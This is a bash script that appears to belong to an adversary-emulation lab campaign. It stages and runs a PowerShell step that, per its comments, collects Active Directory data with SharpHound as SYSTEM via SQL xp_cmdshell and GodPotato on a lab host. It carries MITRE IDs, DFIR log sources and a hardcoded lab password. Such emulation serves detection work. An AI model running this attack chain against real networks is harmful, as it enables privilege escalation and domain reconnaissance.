#!/usr/bin/env bash
# T004 — SharpHound as SYSTEM on mbr01 via SQL xp_cmdshell + GodPotato
# MITRE: T1083 (File and Directory Discovery), T1087 (Account Discovery), T1570 (Lateral Tool Transfer)
# DFIR: Security 4624/4648, Sysmon 1/11, Zeek smb.log, LDAP 4662/5136, WinRM 91/93
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T004-MBR01-BH-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t004-mbr01-bh.ps1"

echo "=== T004 | ${CASE_ID} | T0=${T0} ==="

bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t004-mbr01-bh.ps1"

# Ensure system-exec helper is also staged
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-system-exec.ps1" "campaign-a-t043-system-exec.ps1"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t004-mbr01-bh.ps1 -Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools' -ZipPrefix 'T004-mbr01-bh'"

cadre_export "${CASE_ID}" T004 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T004 complete ==="
